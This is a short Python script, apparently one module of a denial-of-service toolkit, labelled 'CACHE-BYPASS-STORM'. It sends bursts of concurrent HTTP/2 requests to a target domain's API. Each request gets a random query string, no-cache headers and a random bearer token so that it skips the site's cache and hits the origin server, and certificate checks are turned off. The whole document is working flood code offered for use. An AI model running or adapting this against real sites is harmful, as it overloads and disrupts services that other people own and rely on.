import httpx
import asyncio
import uuid

async def send_bypass_request(domain, num_requests=100):
    headers = {
        "User-Agent": "BypassBot/1.0",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
        "Authorization": f"Bearer {uuid.uuid4()}"
    }
    async with httpx.AsyncClient(http2=True, verify=False, timeout=10) as client:
        tasks = []
        for _ in range(num_requests):
            url = f"https://{domain}/api/data?rnd={uuid.uuid4()}"
            tasks.append(client.get(url, headers=headers))
        responses = await asyncio.gather(*tasks, return_exceptions=True)
        success = sum(1 for r in responses if isinstance(r, httpx.Response) and r.status_code < 500)
        fail = len(responses) - success
        print(f"[CACHE-BYPASS-STORM] {num_requests} requests — Success: {success}, Failures: {fail}")

def run_cache_bypass_storm(domain):
    print(f"[+] Running CACHE-BYPASS-STORM on {domain}")
    try:
        asyncio.run(send_bypass_request(domain))
    except Exception as e:
        print(f"[!] Cache bypass error: {e}")